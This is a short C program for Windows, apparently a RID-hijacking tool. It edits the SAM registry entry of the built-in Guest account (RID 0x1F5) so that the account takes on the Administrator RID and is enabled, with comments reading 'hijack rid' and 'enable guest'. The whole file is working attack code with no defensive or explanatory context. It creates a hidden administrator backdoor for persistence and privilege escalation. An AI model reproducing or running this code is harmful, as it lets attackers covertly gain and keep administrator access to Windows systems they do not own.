
#include <Windows.h>
#include <stdio.h>


int  main()
{
	HKEY hKey = NULL;
	PCHAR KeyAddr = NULL;
	DWORD KeySize;
	DWORD KeyType;
	BYTE Buffer[0x50] = { 0 };
	KeyAddr = (PCHAR)"SAM\\SAM\\Domains\\Account\\Users\\000001F5";

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr, 0, KEY_ALL_ACCESS, &hKey);
	RegQueryValueExA(hKey, "F", NULL, &KeyType, (LPBYTE)&Buffer, &KeySize);

	Buffer[0x30] = (BYTE)0xf4; //hijack rid
	Buffer[0x38] = (BYTE)0x14; //enable guest
	
	RegSetValueExA(hKey, "F",NULL, KeyType, Buffer, KeySize);
	RegCloseKey(hKey);
	return 0;
}
